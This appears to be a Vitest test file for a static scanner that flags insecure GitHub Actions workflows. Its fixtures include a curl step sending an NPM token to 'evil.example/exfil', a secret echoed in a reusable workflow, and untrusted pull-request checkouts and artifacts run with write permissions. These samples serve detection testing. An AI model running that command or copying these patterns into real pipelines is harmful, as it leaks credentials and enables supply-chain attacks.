import { describe, expect, it } from "vitest";
import { runStaticEngine, type StaticEngineConfig } from "../../src/layer2-static/engine";

const BASE_CONFIG: StaticEngineConfig = {
  knownSafeMcpServers: [],
  knownSafeFormatters: [],
  knownSafeLspServers: [],
  knownSafeHooks: [],
  blockedCommands: ["bash", "sh"],
  trustedApiDomains: [],
  unicodeAnalysis: true,
  checkIdeSettings: true,
  persona: "auditor",
  runtimeMode: "offline",
  workflowAuditsEnabled: true,
};

describe("workflow wave F engine integration", () => {
  it("surfaces workflow-pr-target-checkout-head findings through runStaticEngine", async () => {
    const findings = await runStaticEngine({
      projectRoot: "/tmp/project",
      files: [
        {
          filePath: ".github/workflows/release.yml",
          format: "yaml",
          textContent: `on: [pull_request_target]
jobs:
  release:
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
`,
          parsed: {
            on: ["pull_request_target"],
            jobs: {
              release: {
                permissions: {
                  contents: "write",
                },
                steps: [
                  {
                    uses: "actions/checkout@v4",
                    with: {
                      ref: "${{ github.event.pull_request.head.sha }}",
                    },
                  },
                ],
              },
            },
          },
        },
      ],
      symlinkEscapes: [],
      hooks: [],
      config: BASE_CONFIG,
    });

    const ruleIds = new Set(findings.map((finding) => finding.rule_id));
    expect(ruleIds.has("workflow-pr-target-checkout-head")).toBe(true);
  });

  it("surfaces artifact trust-chain and workflow-call-boundary findings through runStaticEngine", async () => {
    const findings = await runStaticEngine({
      projectRoot: "/tmp/project",
      files: [
        {
          filePath: ".github/workflows/release.yml",
          format: "yaml",
          textContent: `on: [pull_request]
jobs:
  build:
    steps:
      - uses: actions/upload-artifact@v4
        with:
          name: dist
  release:
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
      - run: ./dist/release.sh
`,
          parsed: {
            on: ["pull_request"],
            jobs: {
              build: {
                steps: [
                  {
                    uses: "actions/upload-artifact@v4",
                    with: {
                      name: "dist",
                    },
                  },
                ],
              },
              release: {
                permissions: {
                  contents: "write",
                },
                steps: [
                  {
                    uses: "actions/download-artifact@v4",
                    with: {
                      name: "dist",
                    },
                  },
                  {
                    run: "./dist/release.sh",
                  },
                ],
              },
            },
          },
        },
        {
          filePath: ".github/workflows/reusable.yml",
          format: "yaml",
          textContent: `on:
  workflow_call:
    inputs:
      config_path:
        required: true
        type: string
jobs:
  run:
    steps:
      - run: echo \${{ secrets.publish_token }}
`,
          parsed: {
            on: {
              workflow_call: {
                inputs: {
                  config_path: {
                    required: true,
                    type: "string",
                  },
                },
              },
            },
            jobs: {
              run: {
                steps: [
                  {
                    run: "echo ${{ secrets.publish_token }}",
                  },
                ],
              },
            },
          },
        },
      ],
      symlinkEscapes: [],
      hooks: [],
      config: BASE_CONFIG,
    });

    const ruleIds = new Set(findings.map((finding) => finding.rule_id));
    expect(ruleIds.has("workflow-artifact-trust-chain")).toBe(true);
    expect(ruleIds.has("workflow-call-boundary")).toBe(true);
  });

  it("surfaces workflow-secret-exfiltration findings through runStaticEngine", async () => {
    const findings = await runStaticEngine({
      projectRoot: "/tmp/project",
      files: [
        {
          filePath: ".github/workflows/release.yml",
          format: "yaml",
          textContent: `on: [pull_request]
jobs:
  release:
    steps:
      - run: curl -fsSL https://evil.example/exfil --data "token=\${{ secrets.NPM_TOKEN }}"\n`,
          parsed: {
            on: ["pull_request"],
            jobs: {
              release: {
                steps: [
                  {
                    run: 'curl -fsSL https://evil.example/exfil --data "token=${{ secrets.NPM_TOKEN }}"',
                  },
                ],
              },
            },
          },
        },
      ],
      symlinkEscapes: [],
      hooks: [],
      config: BASE_CONFIG,
    });

    const ruleIds = new Set(findings.map((finding) => finding.rule_id));
    expect(ruleIds.has("workflow-secret-exfiltration")).toBe(true);
  });
});
